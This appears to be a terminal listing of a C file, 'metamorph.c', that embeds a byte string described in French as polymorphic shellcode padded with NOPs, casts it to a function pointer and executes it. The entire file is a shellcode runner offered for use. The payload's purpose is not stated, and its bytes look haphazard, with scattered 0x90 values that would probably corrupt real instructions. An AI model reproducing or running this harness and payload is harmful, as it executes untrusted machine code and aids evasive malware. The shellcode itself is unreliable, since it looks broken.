# cat metamorph.c
#include <stdio.h>
#include <string.h>

int main() {
    // Shellcode polymorphique avec NOPs ajout√©s
    char code[] = "\xee\x90\xe2\x90\xa8\xbb\x90\x5c\x90\xf5\xe1\x3e\xeb\x90\x90\xc6\x90\x9b\xa5\xaf\xaf\x90\x90\xfa\x55\x90\xfa\xf5\x90\xc4\xfc\xe2\x90\xeb\x1a\x8b\x90\xe2\xf6\x6d\x90\xeb\xff\x90\x90\xc8\xeb\x11\x1d\xa8\x90\x8e\xb1\x19\x90\x5e\x90\xfa\x0e\x90\x90\xaf\x90\xfd\x90\xeb\xa5\x90\x90\xba\xe8\xea\x6a\xe2\x78\x90\x6a\x02\xfe\xf5\xc9\x90\xea\x90\xfa\xf5\xff\x90\x90\xaf\x90\x29\x90\xe2\xff\xff\x90\x85\x1c\x90\x6a\xe2\x31\x90\xeb\x90\x05\x90\xa8\x90\x90\xea\xe2\x9b\x90\x80\xaa\x48\x46\xa2\xa5\xaf\x71\xe2\x6c\xae\xe2\x9b\xea\x1c\xf5\x1a\x90\xee\xaf\x1a\xac\xa5\x8e\x90\x4c\x18\x1a\x90\x90\xa5\x6d\x90\x18\x90\xa8\x90\x6c\x90\x85\x90\x9b\x5c\x90\xc3\x90\x8b\x90\x1a\x90\x5c\x90\x9b\x90\xae\x90\xe3\x23\x83\x90\x1a\x90\x80\x90\xcc\x90\x8e\x90\xe2\x9b\x90\x8b\x90\x15\x90\xea\x90\xff\x85\x90\xab\x90\xe2\xf7\xd9\xc2\x1c\xab\x91\x33\x23\x90\xa5\x90\x90\x63\xe2\x9b\x9b\x90";

    printf("Shellcode length: %d\n", (int)strlen(code));
    
    // Casting the shellcode to a function pointer and executing it
    int (*ret)() = (int(*)())code;
    ret();
    
    return 0;
}
